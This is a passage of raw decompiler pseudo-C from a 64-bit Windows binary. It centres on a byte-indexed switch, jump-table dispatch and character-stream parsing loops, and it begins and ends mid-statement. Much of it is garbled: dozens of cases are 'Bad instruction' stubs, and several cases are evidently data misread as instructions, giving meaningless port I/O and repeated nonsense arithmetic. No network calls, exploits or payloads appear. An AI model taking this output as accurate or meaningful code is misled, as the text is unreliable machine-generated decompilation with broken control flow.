0x1400fe028;\n    uVar50 = (in_stack_00000048 & 0xff) - 100 & 0xff;\n    piStack24 = piVar84;\n    piStack16 = piVar80;\n    iVar58 = *(uVar50 * 4 + 0x1400fe028);\n    UNRECOVERED_JUMPTABLE = auVar87;\n    UNRECOVERED_JUMPTABLE._0_8_ = iVar58 + 0x1400fe028;\n    bVar86 = UNRECOVERED_JUMPTABLE._0_8_ == NULL;\n    uVar41 = UNRECOVERED_JUMPTABLE._0_8_;\n    uVar51 = UNRECOVERED_JUMPTABLE._0_8_;\n    uVar43 = arg3 >> 8;\n    cVar40 = arg1 >> 8;\n    ppiVar33 = &piStack104;\n    ppiVar34 = &piStack104;\n    ppiVar35 = &piStack104;\n    ppiVar36 = &piStack104;\n    ppiVar37 = &piStack104;\n    ppiVar73 = &piStack104;\n    ppiVar38 = &piStack104;\n    ppiVar39 = &piStack104;\n    ppiVar52 = unaff_R12;\n    switch(uVar50) {\n    case 0:\n        (**(*arg3 + 0x20))(uVar57, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x11:\n    case 0x12:\n    case 0x14:\n    case 0x15:\n        (**(*arg3 + 0x38))(uVar57, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 9:\n        (**(*arg3 + 0x30))(uVar57, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x10:\n        (**(*arg3 + 0x18))(uVar57, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x13:\n        (**(*arg3 + 0x28))(uVar57, arg1, arg3, &piStack24, UNRECOVERED_JUMPTABLE);\n        return arg1;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x34:\n    case 0xc9:\n    case 0xfd:\n        iVar66 = unaff_RDI;\n        uVar68 = (arg3 << 0x20 | 0xe8fff7fdU) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd832(uVar57);\n        cVar79 = ppiVar65 >> 8;\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd83a();\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd842();\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0xc90fd84a();\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd852();\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd85a();\n        uVar68 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 & 0xffffffff;\n        uVar59 = func_0x0001290fd862();\n        uVar68 = ((uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66 << 0x20 | piStack104 & 0xffffffff) % iVar66 &\n                 0xffffffff;\n        piStack104 = 0x1400fe071;\n        uVar59 = func_0x0001290fd86e();\n        uVar59 = uVar68 << 0x20 | uVar59 & 0xffffffff;\n        bVar86 = cVar79 == cVar40;\n        uVar68 = (uVar59 % iVar66 << 0x20 | uVar59 / iVar66 & 0xffffffffU) % iVar66 & 0xffffffff;\n        piStack104 = 0x1400fe07d;\n        uVar59 = func_0x0001290fd87a();\n        uVar44 = (uVar68 << 0x20 | uVar59 & 0xffffffff) % iVar66;\n        out(*unaff_RSI, uVar44);\n        out(*(unaff_RSI + -1), uVar44);\n        if (bVar86) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x22:\n    case 0x3f:\n    case 0xba:\n    case 0xca:\n    case 0xd8:\n    case 0xe6:\n    case 0xf2:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x23:\n    case 0x40:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x24:\n    case 0x41:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x48:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n        *(arg3 + 4) = *(arg3 + 4) + cVar40;\n        fcn.1400a3070(0x1400fe028, arg3);\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = 0;\n        in_stack_00000088 = 0;\n        piStack24 = in_stack_00000078;\n        fcn.1400a3070(puStackX32, 0x20);\n        uStack0000000000000044 = uStack0000000000000044 & 0xffff00ff;\n        iStack44 = 0;\n        UNRECOVERED_JUMPTABLE =\n             CONCAT88(SUB168(UNRECOVERED_JUMPTABLE >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003b7b2. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar65 = (*(*(*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) * 4 + 0x1400fe0fc) + 0x1400fe0fc))();\n                return ppiVar65;\n            }\n            uVar41 = 1;\ncode_r0x00014003ba8d:\n            uVar45 = unaff_RDI;\n            auVar87 = UNRECOVERED_JUMPTABLE >> 0x40;\n            UNRECOVERED_JUMPTABLE = CONCAT88(UNRECOVERED_JUMPTABLE._8_8_ + 1, UNRECOVERED_JUMPTABLE._0_8_);\n        } while ((SUB164(auVar87, 0) + 1 < 4 & uVar41) != 0);\n        if ((0x1 < unaff_RBX & uVar41) == 0) {\n            if (uVar41 == 0) {\ncode_r0x00014003bd35:\n                bVar86 = uVar45 == 0xffff;\n                goto code_r0x00014003bd3d;\n            }\njoined_r0x00014003c4d3:\n            if ((1 < in_stack_00000080) && (uVar59 = fcn.1400298f0(puStackX32, 0x30, 0),  uVar59 != 0)) {\n                if (uVar59 == 0xffffffffffffffff) {\n                    uVar59 = in_stack_00000080 - 1;\n                    if (in_stack_00000080 == 0) {\n                        *in_stack_00000078 = '\\0';\n                    }\n                    else if (uVar59 != 0) goto code_r0x00014003c3a0;\n                }\n                else {\ncode_r0x00014003c3a0:\n                    uVar68 = in_stack_00000080;\n                    if (uVar59 <= in_stack_00000080) {\n                        uVar68 = uVar59;\n                    }\n                    fcn.1400a3120(puStackX32, 0, uVar68);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != '0')) {\n                fcn.1400a1690(puStackX32, 0, 0, 1);\n            }\n            piVar84 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                piVar80 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = iStack44;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    piVar69 = 0xf;\n                }\n                else {\n                    piVar69 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n                }\n                if (piVar69 < piVar80) {\n                    fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + piVar84) = uStack0000000000000040;\n                (in_stack_00000058 + 1)[piVar84] = 0;\n                in_stack_00000060 = piVar80;\n                cVar40 = fcn.1400b1590(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar40 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            bVar86 = uVar45 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != iStack44)) goto code_r0x00014003bd3d;\n            fcn.1400a18b0(in_stack_00000118, puStackX32);\n            bVar77 = arg1 != NULL && bVar86;\n            if (arg1 == NULL || !bVar86) goto code_r0x00014003bd58;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                uVar45 = unaff_RDI;\n                bVar86 = uVar45 == 0xffff;\n                bVar81 = arg1 != NULL && bVar86;\n                bVar77 = bVar86;\n                if (bVar81) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar46 = *arg1[2];\n                    }\n                    else {\n                        iVar46 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar46 == -1) {\n                        arg1 = NULL;\n                    }\n                    bVar77 = iVar46 == -1 && bVar81;\n                }\n                bVar81 = unaff_RBP != NULL && iStack46 == -1;\n                if (bVar81) break;\n                if ((iStack46 == -1) == bVar77) goto code_r0x00014003c0d8;\ncode_r0x00014003b83d:\n                if (unaff_RBX <= unaff_R14) goto code_r0x00014003c0d8;\n                uVar48 = uVar45;\n                if ((arg1 != NULL) && (bVar86)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar48 = *arg1[2];\n                    }\n                    else {\n                        uVar48 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar48 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\n                if (*(unaff_R15 + unaff_R14 * 2) != uVar48) goto code_r0x00014003bd3d;\ncode_r0x00014003b866:\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar46 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar46 == -1 && bVar81) != bVar77) goto code_r0x00014003b83d;\ncode_r0x00014003c0d8:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x00014003c4d3;\ncode_r0x00014003bd3d:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar77 = arg1 != NULL & bVar86;\n            if (bVar77 == false) goto code_r0x00014003bd58;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar46 = *arg1[2];\n        }\n        else {\n            iVar46 = (*(*arg1)[9])(arg1);\n        }\n        bVar86 = false;\n        if (iVar46 == -1) {\n            arg1 = NULL;\n            bVar86 = bVar77;\n        }\ncode_r0x00014003bd58:\n        bVar77 = in_stack_00000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar77)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar77 = iVar46 == -1;\n        }\n        if (bVar77 == bVar86) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar45;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != piStack24) {\n            fcn.1400b64d0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400b64d0();\n        }\n        return in_stack_000000e8;\n    case 0x36:\ncode_r0x00014003ba51:\n        if (arg3 == -1) {\n            arg1 = NULL;\n        }\ncode_r0x00014003b995:\n        iVar66 = iStack44;\n        piVar84 = in_stack_00000060;\n        uVar45 = unaff_RDI;\n        do {\n            iVar46 = arg3;\n            if (iVar46 == *UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x00014003b9b2;\n            UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ + 2;\n        } while (UNRECOVERED_JUMPTABLE._0_8_ != unaff_RSI);\n        if (*(piStack56 + 0x22) == iVar46) {\n            uVar41 = uStack0000000000000045;\n            if (uStack0000000000000045 != 0) goto joined_r0x00014003bd2f;\n            if (*(piStack56 + 0xb) < 1) goto code_r0x00014003bd20;\n            _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n            uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n            iStack44 = 0;\n            in_stack_00000040 = CONCAT44(uStack0000000000000044, iVar66);\n            goto code_r0x00014003ba16;\n        }\n        if (*(piStack56 + 4) == 0) goto code_r0x00014003bd20;\n        uVar41 = *(piStack56 + 4);\n        if ((*(piStack56 + 0x24) == iVar46) && (uVar41 = uStack0000000000000045,  uStack0000000000000045 == 0)) {\n            if (iStack44 == 0) {\n                uVar41 = 0;\n                goto joined_r0x00014003bd2f;\n            }\n            piVar80 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                piVar69 = 0xf;\n            }\n            else {\n                piVar69 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n            }\n            if (piVar69 < piVar80) {\n                fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + piVar84) = iStack44;\n            iStack44 = 0;\n            (in_stack_00000058 + 1)[piVar84] = 0;\n            piVar84 = arg1[2];\n            in_stack_00000060 = piVar80;\n            if (arg1[3] <= piVar84) goto code_r0x00014003bc6b;\n            goto code_r0x00014003ba24;\n        }\n        goto joined_r0x00014003bd2f;\n    case 0x37:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        goto code_r0x00014003b9b2;\n    case 0x38:\n        in(arg3);\n        goto code_r0x00014003b98d;\n    case 0x39:\n        goto code_r0x00014003b866;\n    case 0x3a:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        puVar82 = iVar58 + 0x1b41000a0;\n        uVar43 = *puVar82;\n        *puVar82 = *puVar82 + uVar41;\n        cVar79 = *(iVar58 + 0x1400fdfb3);\n        *(UNRECOVERED_JUMPTABLE._0_8_ + arg3 * 4) = in_FS;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(arg3 + 4) = *(arg3 + 4) + cVar40;\n        fcn.1400a3070(CONCAT71(0x1400fe0, cVar79 + '(' + CARRY1(uVar43, uVar41)), arg3);\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = 0;\n        in_stack_00000088 = 0;\n        piStack24 = in_stack_00000078;\n        fcn.1400a3070(puStackX32, 0x20);\n        uStack0000000000000044 = uStack0000000000000044 & 0xffff00ff;\n        iStack44 = 0;\n        UNRECOVERED_JUMPTABLE =\n             CONCAT88(SUB168(UNRECOVERED_JUMPTABLE >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003a472. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar65 = (*(*(*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) * 4 + 0x1400fe110) + 0x1400fe110))();\n                return ppiVar65;\n            }\n            uVar41 = 1;\ncode_r0x00014003a74d:\n            uVar45 = unaff_RDI;\n            auVar87 = UNRECOVERED_JUMPTABLE >> 0x40;\n            UNRECOVERED_JUMPTABLE = CONCAT88(UNRECOVERED_JUMPTABLE._8_8_ + 1, UNRECOVERED_JUMPTABLE._0_8_);\n        } while ((SUB164(auVar87, 0) + 1 < 4 & uVar41) != 0);\n        if ((0x1 < unaff_RBX & uVar41) == 0) {\n            if (uVar41 == 0) {\ncode_r0x00014003a9f5:\n                uVar41 = uVar45 == 0xffff;\n                goto code_r0x00014003a9fd;\n            }\njoined_r0x00014003b193:\n            if ((1 < in_stack_00000080) && (uVar59 = fcn.1400298f0(puStackX32, 0x30, 0),  uVar59 != 0)) {\n                if (uVar59 == 0xffffffffffffffff) {\n                    uVar59 = in_stack_00000080 - 1;\n                    if (in_stack_00000080 == 0) {\n                        *in_stack_00000078 = '\\0';\n                    }\n                    else if (uVar59 != 0) goto code_r0x00014003b060;\n                }\n                else {\ncode_r0x00014003b060:\n                    uVar68 = in_stack_00000080;\n                    if (uVar59 <= in_stack_00000080) {\n                        uVar68 = uVar59;\n                    }\n                    fcn.1400a3120(puStackX32, 0, uVar68);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != '0')) {\n                fcn.1400a1690(puStackX32, 0, 0, 1);\n            }\n            piVar84 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                piVar80 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = iStack44;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    piVar69 = 0xf;\n                }\n                else {\n                    piVar69 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n                }\n                if (piVar69 < piVar80) {\n                    fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + piVar84) = uStack0000000000000040;\n                (in_stack_00000058 + 1)[piVar84] = 0;\n                in_stack_00000060 = piVar80;\n                cVar40 = fcn.1400b1590(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar40 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            uVar41 = uVar45 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != iStack44)) goto code_r0x00014003a9fd;\n            fcn.1400a18b0(in_stack_00000118, puStackX32);\n            bVar86 = arg1 != NULL && uVar41;\n            if (arg1 == NULL || !uVar41) goto code_r0x00014003aa18;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                uVar45 = unaff_RDI;\n                uVar41 = uVar45 == 0xffff;\n                unaff_R12 = uVar41;\n                bVar77 = arg1 != NULL && uVar41;\n                bVar86 = uVar41;\n                if (bVar77) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar46 = *arg1[2];\n                    }\n                    else {\n                        iVar46 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar46 == -1) {\n                        arg1 = NULL;\n                    }\n                    bVar86 = iVar46 == -1 && bVar77;\n                }\n                bVar77 = unaff_RBP != NULL && iStack46 == -1;\n                if (bVar77) break;\n                if ((iStack46 == -1) == bVar86) goto code_r0x00014003ad98;\ncode_r0x00014003a4fd:\n                if (unaff_RBX <= unaff_R14) goto code_r0x00014003ad98;\n                if ((arg1 != NULL) && (uVar41)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar45 = *arg1[2];\n                    }\n                    else {\n                        uVar45 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar45 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\ncode_r0x00014003a51b:\n                uVar41 = unaff_R12;\n                bVar86 = *(unaff_R15 + unaff_R14 * 2) != uVar45;\n                uVar45 = unaff_RDI;\n                if (bVar86) goto code_r0x00014003a9fd;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar46 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar46 == -1 && bVar77) != bVar86) goto code_r0x00014003a4fd;\ncode_r0x00014003ad98:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x00014003b193;\ncode_r0x00014003a9fd:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar86 = arg1 != NULL & uVar41;\n            if (bVar86 == false) goto code_r0x00014003aa18;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar46 = *arg1[2];\n        }\n        else {\n            iVar46 = (*(*arg1)[9])(arg1);\n        }\n        uVar41 = 0;\n        if (iVar46 == -1) {\n            arg1 = NULL;\n            uVar41 = bVar86;\n        }\ncode_r0x00014003aa18:\n        bVar86 = in_stack_00000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar86)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar86 = iVar46 == -1;\n        }\n        if (bVar86 == uVar41) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar45;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != piStack24) {\n            fcn.1400b64d0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400b64d0();\n        }\n        return in_stack_000000e8;\n    case 0x3b:\ncode_r0x00014003a700:\n        if (arg1[2] < arg1[3]) {\n            uVar59 = *arg1[2];\n        }\n        else {\n            uVar50 = (*(*arg1)[9])(arg1);\n            uVar59 = uVar50;\n        }\n        if (uVar59 == -1) {\n            arg1 = NULL;\n        }\ncode_r0x00014003a655:\n        iVar66 = iStack44;\n        piVar84 = in_stack_00000060;\n        uVar45 = unaff_RDI;\n        do {\n            iVar46 = uVar59;\n            if (iVar46 == *UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x00014003a672;\n            UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ + 2;\n        } while (UNRECOVERED_JUMPTABLE._0_8_ != unaff_RSI);\n        if (*(piStack56 + 0x22) == iVar46) {\n            uVar41 = uStack0000000000000045;\n            if (uStack0000000000000045 != 0) goto joined_r0x00014003a9ef;\n            if (*(piStack56 + 0xb) < 1) goto code_r0x00014003a9e0;\n            _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n            uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n            iStack44 = 0;\n            in_stack_00000040 = CONCAT44(uStack0000000000000044, iVar66);\n            goto code_r0x00014003a6d6;\n        }\n        if (*(piStack56 + 4) == 0) goto code_r0x00014003a9e0;\n        uVar41 = *(piStack56 + 4);\n        if ((*(piStack56 + 0x24) == iVar46) && (uVar41 = uStack0000000000000045,  uStack0000000000000045 == 0)) {\n            if (iStack44 == 0) {\n                uVar41 = 0;\n                goto joined_r0x00014003a9ef;\n            }\n            piVar80 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                piVar69 = 0xf;\n            }\n            else {\n                piVar69 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n            }\n            if (piVar69 < piVar80) {\n                fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + piVar84) = iStack44;\n            iStack44 = 0;\n            (in_stack_00000058 + 1)[piVar84] = 0;\n            piVar84 = arg1[2];\n            in_stack_00000060 = piVar80;\n            if (arg1[3] <= piVar84) goto code_r0x00014003a92b;\n            goto code_r0x00014003a6e4;\n        }\n        goto joined_r0x00014003a9ef;\n    case 0x3c:\n        *(unaff_RDI + 0x1400fdfde) = *(unaff_RDI + 0x1400fdfde) + uVar51;\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar41 - 2;\n        goto code_r0x00014003a672;\n    case 0x3d:\n        if (bVar86) goto code_r0x00014003a63c;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        goto code_r0x00014003a63c;\n    case 0x3e:\n        uVar41 = in(0xf);\n        uVar45 = UNRECOVERED_JUMPTABLE._0_8_ & 0xff00 | uVar41;\n        goto code_r0x00014003a51b;\n    case 0x42:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(arg3 + 0x1401006) = *(arg3 + 0x1401006) + '(';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(UNRECOVERED_JUMPTABLE._0_8_ * 2) = *(UNRECOVERED_JUMPTABLE._0_8_ * 2) + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        uVar43 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        uVar64 = *unaff_RSI;\n        puVar60 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar64;\n        *(puVar60 + 1) = *(puVar60 + 1) + uVar64 + CARRY1(uVar43, uVar41);\n        *puVar60 = *puVar60 + uVar64;\n        *(puVar60 * 2) = *(puVar60 * 2) + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 | puVar60;\n        uVar41 = *puVar60;\n        *puVar60 = *puVar60 + uVar64;\n        *unaff_RSI = piStack104;\n        *(puVar60 + 1) = *(puVar60 + 1) + uVar64 + CARRY1(uVar41, uVar64);\n        *puVar60 = *puVar60 + uVar64;\n        *unaff_RDI = *unaff_RDI + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = 